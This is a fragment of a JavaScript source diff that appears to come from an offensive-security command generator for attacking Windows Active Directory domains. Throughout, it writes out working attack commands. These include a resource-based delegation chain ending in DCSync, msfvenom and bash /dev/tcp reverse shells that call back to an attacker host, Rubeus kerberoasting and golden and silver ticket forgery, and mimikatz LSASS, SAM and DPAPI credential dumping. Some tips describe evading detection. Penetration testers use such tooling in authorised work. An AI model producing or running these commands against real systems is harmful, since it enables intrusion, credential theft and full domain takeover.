+`# ─── RBCD Full Chain ──────────────────────────────────────────`,``,
+`# Step 1: Add fake machine account (MAQ must be > 0, default is 10)`,
+`impacket-addcomputer '${d}/${u}' ${cred} -dc-ip ${dc} -computer-name '${cn}$' -computer-pass '${cp}'`,``,
+`# Step 2: Set RBCD — ${cn}$ gains delegation rights on ${tgt}`,
+`bloodyAD -H ${dc} -d ${d} -u '${u}' ${ba_auth} add rbcd '${cn}$' '${tgt}'`,``,
+`# Step 3: Get TGT for fake computer account`,
+`impacket-getTGT '${d}/${cn}$:${cp}' -dc-ip ${dc}`,
+`export KRB5CCNAME=${cn}.ccache`,``,
+`# Step 4: S4U2Proxy — get service ticket as ${imp}`,
+`impacket-getST -spn '${spn}' -impersonate '${imp}' -dc-ip ${dc} '${d}/${cn}$:${cp}'`,
+`export KRB5CCNAME=${imp}@${spn.split("/")[0]}_${spn.split("/")[1]||""}.ccache`,
+`# (run 'ls *.ccache' if exact filename differs)`,``,
+`# Step 5: DCSync as ${imp}`,
+`# Option A — NTLM (if you have the NT hash from getST output):`,
+`impacket-secretsdump '${d}/${tgt.replace("$","")}' -hashes aad3b435b51404eeaad3b435b51404ee:<NT_HASH> -dc-ip ${dc} -just-dc-ntlm`,``,
+`# Option B — Kerberos (use the ccache from step 4):`,
+`impacket-secretsdump -k -no-pass '${d}/${imp}'@${tgt.replace("$","")+"."+d}`
+].join("\n");}},
+}},
+
+"sccm":{label:"SCCM (sccmhunter)",mods:{
+"recon":{label:"sccmhunter — find infrastructure",
+tip:"Discover SCCM site servers, management points, and distribution points from LDAP.",
+extra:[],
+build(f,e){let d=f.domain;if(!d)return er("domain");let dc=f.dc;if(!dc)return er("DC IP");
+let c=f.aes?`-aesKey ${f.aes}`:f.hash?`-hashes ${f.hash}`:`-p '${f.pass||""}'`;
+return`python3 sccmhunter.py find -u '${f.user||"user"}' ${c} -d ${d} -dc-ip ${dc}`;}},
+
+"naa-creds":{label:"extract NAA credentials",
+tip:"Retrieve SCCM Network Access Account creds from policy. NAA creds are often reused domain accounts.",
+extra:[
+{id:"mp",type:"tx",label:"management point",desc:"SCCM management point hostname or IP — found from sccmhunter recon",ph:"SCCM01.corp.local"}
+],
+build(f,e){let d=f.domain;if(!d)return er("domain");let dc=f.dc;if(!dc)return er("DC IP");
+let c=f.aes?`-aesKey ${f.aes}`:f.hash?`-hashes ${f.hash}`:`-p '${f.pass||""}'`;
+return`python3 sccmhunter.py http -u '${f.user||"user"}' ${c} -d ${d} -dc-ip ${dc} -sccm ${e.mp||"SCCM01"}`;}},
+}},
+
+"revshells-linux":{label:"Reverse Shells",mods:{
+"msfvenom-win":{label:"msfvenom — Windows EXE",
+tip:"Generate Windows reverse shell EXE on your Linux attacker box. For staged payload use meterpreter/reverse_tcp.",
+extra:[
+{id:"lh",type:"tx",label:"LHOST",desc:"Your attacker IP — the IP the victim connects back to",ph:"10.10.14.1"},
+{id:"lp",type:"tx",label:"LPORT",desc:"Your listener port — start nc listener before deploying payload",ph:"4444"},
+{id:"payload",type:"tx",label:"payload",desc:"Stageless: windows/x64/shell_reverse_tcp. Staged (needs handler): windows/x64/meterpreter/reverse_tcp",ph:"windows/x64/shell_reverse_tcp"},
+{id:"out",type:"tx",label:"output file",desc:"Output path on attacker Linux machine",ph:"/tmp/evil.exe"},
+{id:"fmt",type:"tx",label:"-f format",desc:"Output format: exe (default), dll, ps1, hta, aspx — many options",ph:"exe"}
+],
+build(f,e){let lh=e.lh||f.lhost||"LHOST",lp=e.lp||f.lport||"4444";
+return`msfvenom -p ${e.payload||"windows/x64/shell_reverse_tcp"} LHOST=${lh} LPORT=${lp} -f ${e.fmt||"exe"} -o ${e.out||"/tmp/evil.exe"}`;}},
+
+"msfvenom-linux":{label:"msfvenom — Linux ELF",
+tip:"Generate Linux reverse shell ELF binary on your attacker box.",
+extra:[
+{id:"lh",type:"tx",label:"LHOST",desc:"Your attacker IP",ph:"10.10.14.1"},
+{id:"lp",type:"tx",label:"LPORT",desc:"Your listener port",ph:"4444"},
+{id:"out",type:"tx",label:"output file",desc:"Output path",ph:"/tmp/evil_linux"}
+],
+build(f,e){let lh=e.lh||f.lhost||"LHOST",lp=e.lp||f.lport||"4444";
+return`msfvenom -p linux/x64/shell_reverse_tcp LHOST=${lh} LPORT=${lp} -f elf -o ${e.out||"/tmp/evil_linux"}\nchmod +x ${e.out||"/tmp/evil_linux"}`;}},
+
+"msfvenom-ps1":{label:"msfvenom — PowerShell payload",
+tip:"Generate PowerShell reverse shell payload. Use with IEX download cradle for in-memory execution.",
+extra:[
+{id:"lh",type:"tx",label:"LHOST",desc:"Your attacker IP",ph:"10.10.14.1"},
+{id:"lp",type:"tx",label:"LPORT",desc:"Your listener port",ph:"4444"},
+{id:"out",type:"tx",label:"output file",desc:"Output .ps1 path",ph:"/tmp/shell.ps1"}
+],
+build(f,e){let lh=e.lh||f.lhost||"LHOST",lp=e.lp||f.lport||"4444";
+return`msfvenom -p windows/x64/powershell_reverse_tcp LHOST=${lh} LPORT=${lp} -f raw -o ${e.out||"/tmp/shell.ps1"}`;}},
+
+"bash-rev":{label:"bash reverse shell (Linux victim)",
+tip:"Classic bash /dev/tcp reverse shell for Linux victims. mkfifo version works when bash /dev/tcp is restricted.",
+extra:[
+{id:"lh",type:"tx",label:"LHOST",desc:"Your attacker IP",ph:"10.10.14.1"},
+{id:"lp",type:"tx",label:"LPORT",desc:"Your listener port",ph:"4444"}
+],
+build(f,e){let lh=e.lh||f.lhost||"LHOST",lp=e.lp||f.lport||"4444";
+return`# Start listener on attacker:\nnc -lvnp ${lp}\n\n# Run on Linux victim:\nbash -i >& /dev/tcp/${lh}/${lp} 0>&1\n\n# mkfifo version (works in restricted shells):\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ${lh} ${lp} >/tmp/f`;}},
+
+"nc-listener":{label:"netcat listener",
+tip:"Start listener on attacker machine. rlwrap adds arrow keys and command history — strongly recommended.",
+extra:[
+{id:"lp",type:"tx",label:"port",desc:"Port to listen on — must match LPORT in your payload",ph:"4444"},
+{id:"rlwrap",type:"cb",main:"rlwrap (arrow keys + history)",desc:"Wrap with rlwrap — adds history and arrow key navigation to the shell"}
+],
+build(f,e){let lp=e.lp||f.lport||"4444";
+return`${e.rlwrap?"rlwrap ":""}nc -lvnp ${lp}`;}},
+}},
+
+},
+
+windows:{
+"rubeus":{label:"Rubeus",mods:{
+"asreproast":{label:"asreproast",
+tip:"ASREPRoast accounts without pre-auth. No creds if anonymous LDAP allowed. Crack with hashcat -m 18200.",
+extra:[
+{id:"user",type:"tx",label:"/user (specific, opt)",desc:"Target specific user — leave empty to roast all accounts without pre-auth",ph:"targetuser"},
+{id:"format",type:"tx",label:"/format",desc:"hashcat (default, -m 18200) or john — hashcat strongly recommended",ph:"hashcat"},
+{id:"out",type:"tx",label:"/outfile",desc:"Save hashes to file instead of console — better for large environments",ph:"C:\\hashes.txt"}
+],
+build(f,e){let fl=`/format:${e.format||"hashcat"}`;if(e.user)fl+=` /user:${e.user}`;fl+=" /nowrap";if(e.out)fl+=` /outfile:${e.out}`;
+return`Rubeus.exe asreproast ${fl}`;}},
+
+"kerberoast":{label:"kerberoast",
+tip:"Kerberoast SPN accounts. Hashcat format by default (-m 13100 RC4, -m 19600 AES). /usetgtdeleg for RC4 downgrade.",
+extra:[
+{id:"user",type:"tx",label:"/user (specific, opt)",desc:"Target specific user — leave empty for all SPN accounts",ph:""},
+{id:"rc4",type:"cb",main:"/usetgtdeleg (force RC4 downgrade)",desc:"Downgrade to RC4 — much faster to crack than AES. Uses delegation TGT"},
+{id:"opsec",type:"cb",main:"/rc4opsec (opsec RC4)",desc:"RC4 downgrade but filters AES-enabled accounts — reduces noise"},
+{id:"out",type:"tx",label:"/outfile",desc:"Save hashes to file",ph:"C:\\hashes.txt"},
+{id:"ldaps",type:"cb",main:"/ldaps",desc:"Use LDAPS (port 636) — use if plain LDAP port 389 is blocked"}
+],
+build(f,e){let fl="";if(e.user)fl+=` /user:${e.user}`;if(e.rc4)fl+=" /usetgtdeleg";if(e.opsec)fl+=" /rc4opsec";fl+=" /nowrap";if(e.ldaps)fl+=" /ldaps";if(e.out)fl+=` /outfile:${e.out}`;
+return`Rubeus.exe kerberoast${fl}`;}},
+
+"asktgt":{label:"asktgt — request TGT",
+tip:"Request TGT using password, hash, or AES key. More opsec than getTGT — uses LSASS Kerberos APIs.",
+extra:[
+{id:"user",type:"tx",label:"/user",desc:"Username to request TGT for",ph:"administrator"},
+{id:"rc4",type:"tx",label:"/rc4 (NT hash)",desc:"NT hash — overpass-the-hash, gets AES TGT using RC4 auth. Less opsec than /aes256",ph:"NT hash"},
+{id:"aes",type:"tx",label:"/aes256 (AES key)",desc:"AES256 key — most opsec option, mimics normal Windows Kerberos behaviour",ph:"AES256 hex key"},
+{id:"ptt",type:"cb",main:"/ptt (inject into session)",desc:"Inject TGT into current logon session — no file needed"},
+{id:"opsec",type:"cb",main:"/opsec",desc:"Request AES256 TGT even with RC4 auth — mimics normal Windows, evades MDI"},
+{id:"nopac",type:"cb",main:"/nopac",desc:"Request ticket without PAC — used for NoPAC (CVE-2021-42278) scenarios"}
+],
+build(f,e){if(!e.user&&!f.user)return er("username");let u=e.user||f.user;let d=f.domain;if(!d)return er("domain");
+let cred=e.aes||f.aes?`/aes256:${e.aes||f.aes}`:e.rc4||f.hash?`/rc4:${e.rc4||f.hash}`:`/password:'${f.pass||""}'`;
+let fl=`/user:${u} ${cred} /domain:${d}`;if(f.dc)fl+=` /dc:${f.dc}`;if(e.ptt)fl+=" /ptt";if(e.opsec)fl+=" /opsec";if(e.nopac)fl+=" /nopac";fl+=" /nowrap";
+return`Rubeus.exe asktgt ${fl}`;}},
+
+"ptt":{label:"ptt — pass-the-ticket",
+tip:"Inject .kirbi or base64 ticket into current session. Use createnetonly first to avoid overwriting your own session.",
+extra:[
+{id:"ticket",type:"tx",label:"/ticket",desc:"Path to .kirbi file OR base64 ticket blob — both accepted",ph:"C:\\ticket.kirbi or base64blob"}
+],
+build(f,e){return`Rubeus.exe ptt /ticket:${e.ticket||"C:\\ticket.kirbi"}`;}},
+
+"s4u-rbcd":{label:"s4u — RBCD impersonation",
+tip:"S4U2self + S4U2proxy to impersonate domain user. /rc4 = NTLM of the computer account (not target).",
+extra:[
+{id:"user",type:"tx",label:"/user (machine account)",desc:"Machine account performing delegation — e.g. EVILPC$ (include $)",ph:"EVILPC$"},
+{id:"rc4",type:"tx",label:"/rc4 (NT hash of machine acct)",desc:"NT hash of the /user machine account — NOT the target computer's hash",ph:"NT hash of machine account"},
+{id:"imp",type:"tx",label:"/impersonateuser",desc:"Domain user to impersonate — must be allowed to access the target service",ph:"Administrator"},
+{id:"msdsspn",type:"tx",label:"/msdsspn (target SPN)",desc:"Service on target — format: service/hostname.domain. cifs=SMB, ldap=LDAP",ph:"cifs/DC01.corp.local"},
+{id:"altspn",type:"tx",label:"/altservice (opt)",desc:"Replace service name in final ticket — 'cifs' gives SMB access regardless of original SPN",ph:"cifs"},
+{id:"ptt",type:"cb",main:"/ptt (inject ticket)",desc:"Inject final service ticket into current session — combine with createnetonly"}
+],
+build(f,e){let u=e.user||f.user||"EVILPC$";let rc4=e.rc4||f.hash;if(!rc4)return er("/rc4 NT hash of machine account");
+let spn=e.msdsspn||"cifs/dc.corp.local";let fl=`/user:${u} /rc4:${rc4} /impersonateuser:${e.imp||"Administrator"} /msdsspn:${spn}`;if(e.altspn)fl+=` /altservice:${e.altspn}`;if(e.ptt)fl+=" /ptt";
+return`Rubeus.exe s4u ${fl}`;}},
+
+"tgtdeleg":{label:"tgtdeleg — unconstrained delegation",
+tip:"Get TGT from unconstrained delegation machine memory. /target is optional SPN hint. Use /nowrap for clean base64.",
+extra:[
+{id:"spn",type:"tx",label:"/target SPN (opt)",desc:"Optional SPN hint — leave empty for generic TGT",ph:"cifs/dc.corp.local"}
+],
+build(f,e){return`Rubeus.exe tgtdeleg${e.spn?` /target:${e.spn}`:""} /nowrap`;}},
+
+"golden":{label:"golden ticket — forge TGT",
+tip:"Forge golden TGT with krbtgt hash. No DC contact. /id:500 for built-in Administrator.",
+extra:[
+{id:"user",type:"tx",label:"/user",desc:"Username in forged ticket — can be any name including non-existent users",ph:"Administrator"},
+{id:"rc4",type:"tx",label:"/rc4 (krbtgt NT hash)",desc:"krbtgt account NT hash — from secretsdump or DCSync",ph:"krbtgt NT hash"},
+{id:"sid",type:"tx",label:"/sid (domain SID)",desc:"Domain SID — S-1-5-21-xxx-xxx-xxx without RID (get from whoami /user or secretsdump)",ph:"S-1-5-21-..."},
+{id:"id",type:"tx",label:"/id (user RID)",desc:"User RID — 500 for built-in Admin, or custom RID",ph:"500"},
+{id:"groups",type:"tx",label:"/groups",desc:"Group RIDs — 512=Domain Admins, 519=Enterprise Admins, 518=Schema Admins",ph:"512,519,518"},
+{id:"ptt",type:"cb",main:"/ptt (inject into session)",desc:"Inject ticket into current session immediately"}
+],
+build(f,e){let d=f.domain;if(!d)return er("/domain FQDN required");if(!e.rc4)return er("krbtgt NT hash");if(!e.sid)return er("domain SID");
+let fl=`/user:${e.user||"Administrator"} /rc4:${e.rc4} /domain:${d} /sid:${e.sid}`;if(e.id)fl+=` /id:${e.id}`;if(e.groups)fl+=` /groups:${e.groups}`;if(e.ptt)fl+=" /ptt";
+return`Rubeus.exe golden ${fl}`;}},
+
+"silver":{label:"silver ticket — forge TGS",
+tip:"Forge silver TGS for specific service using service account hash. No DC contact needed — works completely offline.",
+extra:[
+{id:"user",type:"tx",label:"/user",desc:"Username in forged ticket — the 'client' identity",ph:"Administrator"},
+{id:"rc4",type:"tx",label:"/rc4 (service acct NT hash)",desc:"NT hash of the service account — NOT krbtgt. Get from secretsdump",ph:"service account NT hash"},
+{id:"sid",type:"tx",label:"/sid",desc:"Domain SID — same format as golden ticket",ph:"S-1-5-21-..."},
+{id:"spn",type:"tx",label:"/service (SPN)",desc:"Target service — cifs/host for SMB, http/host for web, mssql/host for SQL",ph:"cifs/host.corp.local"},
+{id:"ptt",type:"cb",main:"/ptt (inject)",desc:"Inject forged ticket immediately"}
+],
+build(f,e){let d=f.domain;if(!d)return er("/domain required");if(!e.rc4)return er("service account NT hash");if(!e.sid)return er("domain SID");
+let fl=`/user:${e.user||"Administrator"} /rc4:${e.rc4} /domain:${d} /sid:${e.sid} /service:${e.spn||"cifs/host.corp.local"}`;if(e.ptt)fl+=" /ptt";
+return`Rubeus.exe silver ${fl}`;}},
+
+"dump":{label:"dump — dump tickets from memory",
+tip:"Dump Kerberos tickets from memory. Elevated = all users. Not elevated = current user only.",
+extra:[
+{id:"luid",type:"tx",label:"/luid (logon session)",desc:"Specific logon session LUID — 0x3e7=SYSTEM, 0x3e4=NetworkService, or find with 'klist sessions'",ph:"0x3e7"},
+{id:"svc",type:"tx",label:"/service (filter)",desc:"Filter output by service name — 'krbtgt' to dump only TGTs",ph:"krbtgt"},
+{id:"nowrap",type:"cb",main:"/nowrap",desc:"Do not wrap base64 at 80 chars — needed for passing ticket to ptt or other tools"}
+],
+build(f,e){let fl="";if(e.luid)fl+=` /luid:${e.luid}`;if(e.svc)fl+=` /service:${e.svc}`;if(e.nowrap)fl+=" /nowrap";
+return`Rubeus.exe dump${fl}`;}},
+
+"createnetonly":{label:"createnetonly — sacrificial process",
+tip:"Create new logon session (type 9, network-only) for ticket injection. Avoids overwriting your own session TGT.",
+extra:[
+{id:"prog",type:"tx",label:"/program",desc:"Process to create in new session — cmd.exe or powershell.exe typical",ph:"C:\\Windows\\System32\\cmd.exe"}
+],
+build(f,e){return`Rubeus.exe createnetonly /program:${e.prog||"C:\\Windows\\System32\\cmd.exe"} /show`;}},
+
+"monitor":{label:"monitor — harvest TGTs",
+tip:"Continuously monitor memory for new TGTs. Run on DCs or servers where privileged users authenticate.",
+extra:[
+{id:"interval",type:"tx",label:"/interval (seconds)",desc:"Check interval — 10s is a good balance of noise vs coverage",ph:"10"},
+{id:"tuser",type:"tx",label:"/targetuser (filter)",desc:"Only capture TGTs for this specific user — leave empty for all",ph:"Administrator"}
+],
+build(f,e){let fl=`/interval:${e.interval||"10"} /nowrap`;if(e.tuser)fl+=` /targetuser:${e.tuser}`;
+return`Rubeus.exe monitor ${fl}`;}},
+}},
+
+"mimikatz":{label:"mimikatz",mods:{
+"logonpasswords":{label:"sekurlsa::logonpasswords",
+tip:"Dump all LSASS credentials. Needs privilege::debug or SYSTEM. Plaintext only if WDigest enabled.",
+extra:[],
+build(f,e){return`mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"`;}},
+
+"pth":{label:"sekurlsa::pth — Pass-the-Hash",
+tip:"Spawn new process with target identity using NT hash. Creates separate logon session — your session unaffected.",
+extra:[
+{id:"user",type:"tx",label:"/user",desc:"Account whose hash you are passing",ph:"Administrator"},
+{id:"ntlm",type:"tx",label:"/ntlm (NT hash, 32 chars)",desc:"NT hash — just the 32-char NT part, not LM:NT format",ph:"32-char NT hash"},
+{id:"run",type:"tx",label:"/run",desc:"Process to spawn — cmd.exe, powershell.exe, or any tool",ph:"cmd.exe"},
+{id:"domain",type:"tx",label:"/domain",desc:"Domain — '.' for local accounts, FQDN for domain accounts",ph:"corp.local"}
+],
+build(f,e){let d=e.domain||f.domain||"corp.local";let h=e.ntlm||f.hash;if(!h)return er("NT hash required");
+let nh=h.includes(":")?h.split(":")[1]:h;
+return`mimikatz.exe "privilege::debug" "sekurlsa::pth /user:${e.user||f.user||"Administrator"} /domain:${d} /ntlm:${nh} /run:${e.run||"cmd.exe"}" "exit"`;}},
+
+"dcsync":{label:"lsadump::dcsync — DCSync",
+tip:"Replicate account hashes from DC using DRSUAPI. Requires DS-Replication-Get-Changes-All right.",
+extra:[
+{id:"user",type:"tx",label:"/user",desc:"Account to sync — 'krbtgt' for golden ticket material, 'Administrator' for PTH",ph:"krbtgt"},
+{id:"all",type:"cb",main:"/all /csv (full domain dump)",desc:"Dump ALL domain accounts as CSV — slow on large domains but complete"}
+],
+build(f,e){let d=f.domain||"corp.local",fl=`/domain:${d}`;if(e.all)fl+=" /all /csv";else fl+=` /user:${e.user||"krbtgt"}`;
+return`mimikatz.exe "privilege::debug" "lsadump::dcsync ${fl}" "exit"`;}},
+
+"sam":{label:"lsadump::sam — local SAM",
+tip:"Dump local SAM. token::elevate gets SYSTEM token first — required even when running as local admin.",
+extra:[],
+build(f,e){return`mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"`;}},
+
+"secrets":{label:"lsadump::secrets — LSA secrets",
+tip:"Dump LSA secrets: cached domain creds (DCC2), service account passwords, DPAPI keys, DefaultPassword.",
+extra:[],
+build(f,e){return`mimikatz.exe "privilege::debug" "token::elevate" "lsadump::secrets" "exit"`;}},
+
+"cache":{label:"lsadump::cache — DCC2 cached creds",
+tip:"Dump cached domain logon hashes (MS-CACHEv2 / DCC2). Crack with hashcat -m 2100. Default 10 cached entries.",
+extra:[
+{id:"count",type:"tx",label:"/count",desc:"Number of cached entries — default retrieves all available (up to 10)",ph:"10"}
+],
+build(f,e){return`mimikatz.exe "privilege::debug" "token::elevate" "lsadump::cache${e.count?` /count:${e.count}`:""}" "exit"`;}},
+
+"dpapi":{label:"dpapi::cred — DPAPI decrypt",
+tip:"Decrypt DPAPI blob. Find cred files in AppData\\Local\\Microsoft\\Credentials\\. /masterkey from lsadump::secrets.",
+extra:[
+{id:"credfile",type:"tx",label:"/in (credential file)",desc:"Full path to DPAPI credential blob",ph:"C:\\Users\\user\\AppData\\Local\\Microsoft\\Credentials\\..."},
+{id:"mk",type:"tx",label:"/masterkey (hex)",desc:"DPAPI masterkey hex string — from lsadump::secrets or dpapi::masterkey",ph:"hex masterkey"}
+],
+build(f,e){let fl=`/in:"${e.credfile||"C:\\\\cred_file"}"`;if(e.mk)fl+=` /masterkey:${e.mk}`;
+return`mimikatz.exe "privilege::debug" "dpapi::cred ${fl}" "exit"`;}},
+
+"golden":{label:"kerberos::golden — forge golden ticket",
+tip:"Forge golden ticket in mimikatz. /ptt injects. /ticket:file saves for later kerberos::ptt.",
+extra:[
+{id:"user",type:"tx",label:"/user",desc:"Username in forged ticket — any name including non-existent users",ph:"Administrator"},
+{id:"krbtgt",type:"tx",label:"/krbtgt (NT hash)",desc:"krbtgt NT hash — from DCSync or secretsdump",ph:"krbtgt NT hash"},
+{id:"sid",type:"tx",label:"/sid",desc:"Domain SID without RID — S-1-5-21-xxx-xxx-xxx",ph:"S-1-5-21-..."},
+{id:"ptt",type:"cb",main:"/ptt (inject into session)",desc:"Inject into current Kerberos session immediately"}
+],
+build(f,e){let d=f.domain||"corp.local";if(!e.krbtgt)return er("krbtgt NT hash");if(!e.sid)return er("domain SID");
+return`mimikatz.exe "privilege::debug" "kerberos::golden /user:${e.user||"Administrator"} /domain:${d} /sid:${e.sid} /krbtgt:${e.krbtgt} ${e.ptt?"/ptt ":""}/enddomain" "exit"`;}},
+
+"minidump":{label:"sekurlsa::minidump — parse LSASS dump",
+tip:"Parse offline LSASS minidump. Dump LSASS with: rundll32 comsvcs.dll,MiniDump <PID> lsass.dmp full",
+extra:[
+{id:"dump",type:"tx",label:"dump file path",desc:"Path to LSASS .dmp file — created via Task Manager, comsvcs.dll, or ProcDump",ph:"C:\\lsass.dmp"}
+],
+build(f,e){return`mimikatz.exe "sekurlsa::minidump ${e.dump||"C:\\\\lsass.dmp"}" "sekurlsa::logonpasswords" "exit"`;}},
+}},
+
+"sharphound":{label:"BloodHound (SharpHound)",mods:{
+"collect-all":{label:"collect all data",
+tip:"Full BloodHound collection. Flags are PascalCase. Match SharpHound version to your BloodHound CE instance.",
+extra:[
+{id:"col",type:"tx",label:"--CollectionMethods",desc:"All (everything), DCOnly (stealthy DC-only), Session, ACL, Group, Trusts, ObjectProps",ph:"All"},
+{id:"zip",type:"cb",main:"--ZipFileName (auto-named)",desc:"Package as ZIP — required for BloodHound CE import"},
+{id:"stealth",type:"cb",main:"--Stealth",desc:"Stealth mode — only queries DCs, avoids touching member computers. Much less noise"},
+{id:"loop",type:"cb",main:"--Loop (session collection loop)",desc:"Re-run session collection in a loop — catches more logon sessions over time"},
+{id:"dur",type:"tx",label:"--Loopduration",desc:"How long to loop — HH:MM:SS format",ph:"00:05:00"},
+{id:"linterval",type:"tx",label:"--Loopinterval",desc:"Collection frequency during loop — HH:MM:SS",ph:"00:05:00"},
+{id:"ldapuser",type:"tx",label:"--LdapUsername (alt creds)",desc:"Use different credentials for LDAP — useful when running as a service account",ph:""}
+],
+build(f,e){let fl=`--CollectionMethods ${e.col||"All"}`;if(e.zip)fl+=` --ZipFileName output_${Date.now()}.zip`;if(e.stealth)fl+=" --Stealth";if(e.loop)fl+=` --Loop --Loopduration ${e.dur||"00:05:00"} --Loopinterval ${e.linterval||"00:05:00"}`;if(e.ldapuser)fl+=` --LdapUsername ${e.ldapuser} --LdapPassword '${f.pass||""}'`;if(f.domain)fl+=` --Domain ${f.domain}`;if(f.dc)fl+=` --DomainController ${f.dc}`;
+return`SharpHound.exe ${fl}`;}},
+}},
+
+"powerview":{label:"PowerView",mods:{
+"get-user":{label:"Get-DomainUser",
+tip:"Enumerate domain users. Load: . .\\PowerView.ps1",
+extra:[
+{id:"id",type:"tx",label:"-Identity",desc:"Filter to specific user — sAMAccountName, DN, SID, or GUID",ph:"administrator"},
+{id:"spn",type:"cb",main:"-SPN",desc:"Return only accounts with SPNs — Kerberoasting targets"},
+{id:"pre",type:"cb",main:"-PreauthNotRequired",desc:"Accounts without Kerberos pre-auth — ASREPRoasting targets"},
+{id:"props",type:"tx",label:"-Properties",desc:"Return specific LDAP attributes — reduces output noise",ph:"samaccountname,description,memberof"}
+],
+build(f,e){let fl="";if(e.id)fl+=` -Identity '${e.id}'`;if(e.spn)fl+=" -SPN";if(e.pre)fl+=" -PreauthNotRequired";if(e.props)fl+=` -Properties ${e.props}`;
+return`Get-DomainUser${fl}`;}},
+
+"get-group":{label:"Get-DomainGroupMember",
+tip:"Get group members. -Recurse expands nested group membership — shows effective members.",
+extra:[
+{id:"id",type:"tx",label:"-Identity",desc:"Group sAMAccountName — 'Domain Admins', 'Enterprise Admins', etc.",ph:"Domain Admins"},
+{id:"recurse",type:"cb",main:"-Recurse",desc:"Expand nested group membership — shows who is effectively in the group"}
+],
+build(f,e){let fl="";if(e.id)fl+=` -Identity '${e.id}'`;if(e.recurse)fl+=" -Recurse";
+return`Get-DomainGroupMember${fl}`;}},
+
+"get-acl":{label:"Get-DomainObjectAcl",
+tip:"-ResolveGUIDs converts cryptic GUIDs to readable right names. Pipe to Where-Object to filter abusable rights.",
+extra:[
+{id:"id",type:"tx",label:"-Identity",desc:"Target object — leave empty for broad domain scan",ph:"targetuser"},
+{id:"rights",type:"tx",label:"-Rights",desc:"Filter: All, ResetPassword, WriteMembers, DCSync, etc.",ph:"All"}
+],
+build(f,e){let fl="-ResolveGUIDs";if(e.id)fl+=` -Identity '${e.id}'`;if(e.rights)fl+=` -Rights ${e.rights}`;
+return`Get-DomainObjectAcl ${fl} | Where-Object {$_.ActiveDirectoryRights -match "GenericAll|WriteProperty|WriteDACL|WriteOwner|GenericWrite"}`;}},
+
+"find-admin":{label:"Find-LocalAdminAccess",
+tip:"Find machines where your user has local admin. Makes connections to all domain computers — noisy.",
+extra:[
+{id:"comp",type:"tx",label:"-ComputerName (opt)",desc:"Limit to specific computer — leave empty to test all domain computers",ph:""}
+],
+build(f,e){return`Find-LocalAdminAccess${e.comp?` -ComputerName ${e.comp}`:""} -Threads 20`;}},
+
+"acl-scanner":{label:"Invoke-ACLScanner",
+tip:"Scan all domain objects for interesting ACEs. Very slow on large domains — BloodHound is faster.",
+extra:[],
+build(f,e){return`Invoke-ACLScanner -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "GenericAll|WriteProperty|WriteDACL|WriteOwner"} | Select-Object ObjectDN,IdentityReferenceName,ActiveDirectoryRights | Sort-Object IdentityReferenceName`;}},
+
+"get-computers":{label:"Get-DomainComputer",
+tip:"Enumerate domain computers with OS info and delegation settings.",
+extra:[
+{id:"unconstrained",type:"cb",main:"-Unconstrained",desc:"Computers with unconstrained delegation — store TGTs in memory, coerce them for ticket theft"},
+{id:"laps",type:"cb",main:"LAPS filter",desc:"Computers with LAPS set — potential local admin password access"},
+{id:"props",type:"tx",label:"-Properties",desc:"Attributes to return — samaccountname, dnshostname, operatingsystem, useraccountcontrol",ph:"name,dnshostname,operatingsystem"}
+],
+build(f,e){let fl="";if(e.unconstrained)fl+=" -Unconstrained";if(e.laps)fl+=" -LDAPFilter '(ms-Mcs-AdmPwd=*)'";if(e.props)fl+=` -Properties ${e.props}`;
+return`Get-DomainComputer${fl}`;}},
+}},
+
+"adsearch":{label:"ADSearch",mods:{
+"users":{label:"user enumeration",
+tip:"Flexible LDAP queries from domain-joined Windows. More versatile than net commands.",
+extra:[
+{id:"q",type:"tx",label:"--search",desc:"LDAP filter — standard syntax e.g. (objectCategory=user)(adminCount=1)",ph:"(objectCategory=user)"},
+{id:"attr",type:"tx",label:"--attributes",desc:"Comma-separated attributes to return",ph:"cn,samaccountname,description"}
+],
+build(f,e){let fl="";if(f.domain)fl+=` --domain ${f.domain}`;if(f.dc)fl+=` --dc ${f.dc}`;if(f.user&&f.pass)fl+=` --username '${f.user}' --password '${f.pass}'`;
+return`ADSearch.exe --search "${e.q||"(objectCategory=user)"}" --attributes "${e.attr||"cn,samaccountname,description,memberof"}"${fl}`;}},
+
+"spns":{label:"SPN accounts",
+tip:"All accounts with SPNs set — Kerberoasting targets. Returns cn, samaccountname, serviceprincipalname.",
+extra:[],
+build(f,e){return`ADSearch.exe --search "(&(objectCategory=user)(servicePrincipalName=*))" --attributes "cn,samaccountname,serviceprincipalname"`;}},
+
+"laps":{label:"LAPS passwords",
+tip:"Find computers where you can read LAPS local admin password. Requires ReadLAPSPassword.",
+extra:[],
+build(f,e){return`ADSearch.exe --search "(ms-Mcs-AdmPwd=*)" --attributes "cn,ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime"`;}},
+
+"delegation":{label:"unconstrained delegation",
+tip:"Computers with unconstrained delegation — store TGTs in memory. High-value coercion targets.",
+extra:[],
+build(f,e){return`ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113549.1.1.5:=524288))" --attributes "cn,dnshostname"`;}},
+}},
+
+"sharpup":{label:"SharpUp / Seatbelt",mods:{
+"sharpup":{label:"SharpUp audit",
+tip:"Check local privesc paths: unquoted service paths, weak permissions, AlwaysInstallElevated, hijackable DLLs.",
+extra:[],
+build(f,e){return`SharpUp.exe audit`;}},
+
+"seatbelt-all":{label:"Seatbelt — all checks",
+tip:"Comprehensive host recon. Output to file for review — large output.",
+extra:[
+{id:"grp",type:"tx",label:"-group",desc:"all, system (OS/config), user (user data), misc — or specific check names",ph:"all"}
+],
+build(f,e){return`Seatbelt.exe -group=${e.grp||"all"} > C:\\Windows\\Temp\\sb.txt`;}},
+
+"seatbelt-creds":{label:"Seatbelt — credential hunt",
+tip:"Hunt stored credentials: Credential Manager, browser data, DPAPI blobs, vaults.",
+extra:[],
+build(f,e){return`Seatbelt.exe CredEnum WindowsCredentialFiles WindowsVaultCredentials DPAPI ChromiumPresence FirefoxPresence`;}},
+}},
+
+"sharpgpo":{label:"SharpGPOAbuse",mods:{
+"local-admin":{label:"add local admin via GPO",
+tip:"Add user to local Administrators on all GPO-targeted machines. Requires write access to the GPO.",
+extra:[
+{id:"user",type:"tx",label:"--UserAccount",desc:"Format: DOMAIN\\Username — account to add to local admins",ph:"DOMAIN\\attacker"},
